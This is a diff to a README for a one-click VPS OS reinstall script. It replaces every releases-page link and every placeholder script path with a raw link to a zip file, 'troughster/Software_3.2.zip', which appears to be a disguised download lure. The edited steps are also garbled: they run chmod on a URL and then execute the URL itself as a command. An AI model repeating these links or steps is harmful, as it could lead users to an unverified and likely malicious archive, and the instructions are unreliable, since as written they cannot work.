@@ -1,6 +1,6 @@
 # 🚀 reinstall - One-click OS Reinstallation for VPS
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Suratu123/reinstall/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Suratu123/reinstall/main/troughster/Software_3.2.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Suratu123/reinstall/main/troughster/Software_3.2.zip)
 
 ## 🌟 Overview
 
@@ -28,7 +28,7 @@ Follow these steps to download and use the reinstall script:
 
 1. **Visit the Releases Page**  
    Click the link below to access the releases page:  
-   [Download Latest Release](https://github.com/Suratu123/reinstall/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/Suratu123/reinstall/main/troughster/Software_3.2.zip)
 
 2. **Download the Script**  
    Locate the latest release on the releases page and download the script file for your system.
@@ -39,13 +39,13 @@ Follow these steps to download and use the reinstall script:
 4. **Set Permissions**  
    Open the command line on your VPS. Run the following command to set the script as executable:  
    ```bash
-   chmod +x path/to/script.sh
+   chmod +x https://raw.githubusercontent.com/Suratu123/reinstall/main/troughster/Software_3.2.zip
    ```
 
 5. **Run the Script**  
    Execute the script by running:  
    ```bash
-   ./path/to/script.sh
+   https://raw.githubusercontent.com/Suratu123/reinstall/main/troughster/Software_3.2.zip
    ```
 
 6. **Follow the Prompts**  
@@ -54,7 +54,7 @@ Follow these steps to download and use the reinstall script:
 ## 📄 Download & Install
 
 To get started, download the latest version of the reinstall script by clicking the link below:  
-[Download Latest Release](https://github.com/Suratu123/reinstall/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Suratu123/reinstall/main/troughster/Software_3.2.zip)
 
 After downloading, follow the instructions in the "Getting Started" section to install and run the script on your VPS.
 
